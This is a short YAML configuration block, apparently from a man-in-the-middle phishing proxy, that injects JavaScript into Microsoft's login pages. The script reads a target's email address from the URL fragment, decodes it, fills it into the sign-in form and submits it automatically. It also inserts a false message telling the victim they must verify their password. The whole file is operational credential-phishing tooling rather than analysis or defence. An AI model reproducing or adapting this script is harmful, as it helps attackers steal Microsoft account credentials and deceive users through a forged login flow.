js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    # trigger_paths: ["/common/oauth2/", "/", "/*"]
    trigger_paths: ["/common/oauth2/v2.0/authorize*"]
    script: |
      setTimeout(() => {console.log("this is the first message")}, 12000);
      window.addEventListener("load", () => {
        function decodeBase64IfNeeded(encodedValue) {
            const countEquals = str => str.split('=').length - 1;
            let paddedValue;
            if (countEquals(encodedValue) === 1) {
              paddedValue = encodedValue + "="
            } else if (countEquals(encodedValue) === 2) {
              paddedValue = encodedValue
            } else {
              return encodedValue;
            }
            try {
                const decodedValue = atob(paddedValue);
                return decodedValue;
            } catch (error) {
                return
            }
        }
        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));
        const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
        waitForElm("#i0116").then((elm) => {
          if (window.location.hash.length == 0) {
            return
          }
          elm.focus();
          yinp = window.location.hash.slice(1);
          ysinp = decodeBase64IfNeeded(yinp);
          const sinp = decodeBase64IfNeeded(yinp);
          elm.value = yinp.replace(/=$/, "");
          console.log("reached here");
          const submBtn = document.querySelector("#idSIButton9");
          submBtn.focus();
          submBtn.click();
        });
        waitForElm("#loginHeader").then((elm) => {
          let p = document.createElement('p');
          p.textContent = "Because you're accessing sensitive info you need to verify your password";
          document.querySelectorAll("#loginHeader")[0].appendChild(p); 
          console.log("reached here first");
        });
      });

      

     
